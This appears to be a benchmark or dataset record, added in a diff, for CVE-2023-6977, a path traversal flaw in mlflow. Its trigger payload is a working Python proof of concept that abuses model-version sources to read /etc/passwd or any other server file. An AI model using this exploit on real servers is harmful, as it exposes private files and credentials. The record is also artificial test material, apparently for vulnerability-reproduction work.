@@ -1,0 +1,15 @@
+{
+  "file_id": "156_mlflow_huntr_fe53bf71-3687-4711-90df-c26172880aaf",
+  "numeric_id": "156",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in mlflow due to improper URI validation allowing local file disclosure",
+  "cve": "CVE-2023-6977",
+  "cwe": "CWE-29: Path Traversal",
+  "library": "mlflow",
+  "affected_version": ">= 1.0.0, < 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\ns = requests.Session()\nbase_url = \"{BASE_URL}\"\n# Create model\ndef create(name):\n    data = {\n        \"name\": name,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/registered-models/create\",\n        json=data,\n    )\n# Create model version\ndef create_version(name, source):\n    data = {\n        \"name\": name,\n        \"source\": source,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/model-versions/create\",\n        json=data,\n    )\n# Get model version artifact\ndef get(name, path, version=1):\n    params = {\n        \"name\": name,\n        \"path\": path,\n        \"version\": version,\n    }\n    return s.get(\n        f\"{base_url}/model-versions/get-artifact\",\n        params=params,\n    )\nif __name__ == \"__main__\":\n    # Create model\n    name = \"PoC\"\n    resp = create(name)\n    # Create model version\n    resp = create_version(name, source='//proc/self/root')\n    # Get artifact\n    file_to_read = \"/etc/passwd\" # can be changed to any filepath\n    path = file_to_read.lstrip(\"/\") # remove leading slash\n    resp = get(name, path=path, version=1)\n    print(resp.text)",
+  "oracle": "The server returns the contents of the /etc/passwd file (or any other file specified in the path parameter) in the HTTP response."
+}
